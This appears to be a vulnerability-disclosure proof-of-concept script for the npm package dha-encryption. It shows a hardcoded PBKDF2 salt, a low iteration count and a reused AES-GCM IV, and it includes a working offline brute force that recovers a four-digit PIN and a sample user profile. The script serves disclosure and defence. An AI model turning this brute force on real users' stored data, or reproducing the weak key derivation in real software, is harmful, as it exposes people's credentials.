/**
 * CVE PoC — dha-encryption <= 3.3.1
 * CWE-916: Use of Password Hash With Insufficient Computational Effort
 *
 * Demonstrates three cryptographic weaknesses in the dha-encryption npm package:
 *   1. Hardcoded default PBKDF2 salt ("h0n3yp0t!@")
 *   2. Only 1,337 PBKDF2-SHA256 iterations (OWASP minimum: 600,000)
 *   3. Deterministic IV derivation breaks AES-GCM nonce uniqueness
 *
 * This PoC uses only the public npm package. No external systems are contacted.
 *
 * Usage: node poc.mjs
 */

import { getKeyFromPassword, encrypt, decrypt } from "dha-encryption";

const SALT = "h0n3yp0t!@";

// ─── Helper ──────────────────────────────────────────────────────────────────

function bufToHex(buf) {
  return [...new Uint8Array(buf)].map((b) => b.toString(16).padStart(2, "0")).join("");
}

// ─── 1. Demonstrate hardcoded salt + deterministic IV ────────────────────────

async function demonstrateIVReuse() {

  const pin = "5678";

  // Derive twice with same PIN — IV must differ for AES-GCM security
  const kp1 = await getKeyFromPassword(pin);
  const kp2 = await getKeyFromPassword(pin);

  // Export raw IV bytes for comparison
  const iv1 = bufToHex(kp1.iv);
  const iv2 = bufToHex(kp2.iv);

  console.log(`  PIN:          ${pin}`);
  console.log(`  Default salt: ${SALT}`);
  console.log(`  IV (call 1):  ${iv1}`);
  console.log(`  IV (call 2):  ${iv2}`);
  console.log(`  Identical:    ${iv1 === iv2}`);
  console.log();
  console.log("  AES-GCM requires a unique nonce per encryption operation.");
  console.log("  Reusing a nonce under the same key destroys authenticity");
  console.log("  and enables plaintext recovery across ciphertexts.\n");
}

// ─── 2. Encrypt sample data, then brute-force the PIN offline ────────────────

async function demonstrateBruteForce() {

  // Simulate what dha-login does: encrypt a user profile under a PIN
  const victimPIN = "4092";
  const plaintext = JSON.stringify({
    username: "jane.doe.mil",
    answer1: "Fort Campbell",
    answer2: "Peterson",
  });

  console.log(`  Victim PIN:       ${victimPIN}`);
  console.log(`  Plaintext:        ${plaintext}\n`);

  // Encrypt with the library's own API (default salt)
  const victimKP = await getKeyFromPassword(victimPIN);
  const ciphertext = await encrypt(plaintext, victimKP);

  console.log(`  Ciphertext (hex): ${bufToHex(ciphertext).slice(0, 64)}…`);
  console.log(`  Ciphertext size:  ${ciphertext.byteLength} bytes\n`);
  console.log("  Brute-forcing all 10,000 PINs against ciphertext…\n");

  const start = performance.now();
  let recovered = null;
  let attempts = 0;

  for (let i = 0; i <= 9999; i++) {
    const guess = i.toString().padStart(4, "0");
    attempts++;
    try {
      const kp = await getKeyFromPassword(guess);
      const result = await decrypt(ciphertext, kp);
      recovered = { pin: guess, plaintext: result };
      break; // AES-GCM auth tag only passes on correct key
    } catch {
      // Auth tag mismatch — wrong PIN, continue
    }
  }

  const elapsed = ((performance.now() - start) / 1000).toFixed(2);

  if (recovered) {
    console.log(`  ✓ PIN recovered:  ${recovered.pin}`);
    console.log(`  ✓ Plaintext:      ${recovered.plaintext}`);
    console.log(`  ✓ Attempts:       ${attempts.toLocaleString()} of 10,000`);
    console.log(`  ✓ Time:           ${elapsed} s\n`);
  } else {
    console.log(`  ✗ PIN not found after exhausting keyspace in ${elapsed} s\n`);
  }
}

// ─── 3. Show iteration count vs OWASP minimum ───────────────────────────────

function showIterationComparison() {

  const actual = 1_337;
  const owasp = 600_000;
  const factor = Math.floor(owasp / actual);

  console.log(`  dha-encryption:   ${actual.toLocaleString()} iterations`);
  console.log(`  OWASP minimum:    ${owasp.toLocaleString()} iterations`);
  console.log(`  Factor below:     ${factor}×\n`);
}

// ─── Run ─────────────────────────────────────────────────────────────────────

console.log();
console.log("  dha-encryption <= 3.3.1 — Cryptographic Weakness PoC");
console.log("  Package: https://www.npmjs.com/package/dha-encryption");
console.log();

showIterationComparison();
await demonstrateIVReuse();
await demonstrateBruteForce();

console.log("  The hardcoded salt, 1,337 PBKDF2 iterations, and");
console.log("  deterministic IV derivation allow an attacker with access");
console.log("  to ciphertext (device storage, backup, XSS) to recover");
console.log("  plaintext credentials offline in seconds.\n");
